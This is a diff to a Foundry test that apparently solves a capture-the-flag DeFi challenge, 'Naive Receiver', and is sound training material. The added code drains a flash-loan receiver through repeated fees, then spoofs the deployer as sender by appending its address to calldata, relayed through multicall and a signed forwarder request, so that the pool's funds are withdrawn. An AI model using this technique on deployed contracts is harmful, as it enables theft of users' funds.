@@ -3,9 +3,9 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
-import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
-import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {NaiveReceiverPool, Multicall, WETH} from "../src/NaiveReceiverPool.sol";
+import {FlashLoanReceiver} from "../src/FlashLoanReceiver.sol";
+import {BasicForwarder} from "../src/BasicForwarder.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -77,6 +77,49 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        bytes[] memory data=new bytes[](11); // 11 because the receiver has 10 weth as a start
+        for (uint256 i=0;i<10;i++){
+            //e prepare the flashloan function with a null amount and address (we just need to fill it no need for actual money transfer)
+            // not interested in actual flash loan, we just want him to pay the fee
+            data[i]=abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), 0, "0x"); 
+            }
+            //e withdraw accepts amount and receiver
+            // "receiver" is the one that has the 1000 weth
+            // deployer address is the last 20 bytes of data
+            data[10]=abi.encodePacked(abi.encodeWithSelector(pool.withdraw.selector, WETH_IN_POOL+WETH_IN_RECEIVER,payable(recovery)),deployer);
+            
+            //e encode calldata with the multicall, which allows us to forward a lot of calls together to the pool
+            bytes memory multicall=abi.encodeCall(pool.multicall,data);
+
+            //e create forwarded request
+            BasicForwarder.Request memory req = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0 ,
+            gas: gasleft(),
+            nonce: 0,
+            data: multicall,
+            deadline: 1337 days
+            });
+
+            //e hash our request
+            bytes32 requestHash=keccak256(
+                abi.encodePacked(
+                 "\x19\x01"   ,
+                 forwarder.domainSeparator(),
+                 forwarder.getDataHash(req)
+                )
+            );
+
+            //e sign our request else it will fail
+            (uint8 v, bytes32 r, bytes32 s)=vm.sign(playerPk,requestHash);
+            bytes memory signature=abi.encodePacked(r,s,v);
+
+            //e execute request
+            forwarder.execute(req,signature);
+
+
+
         
     }
 
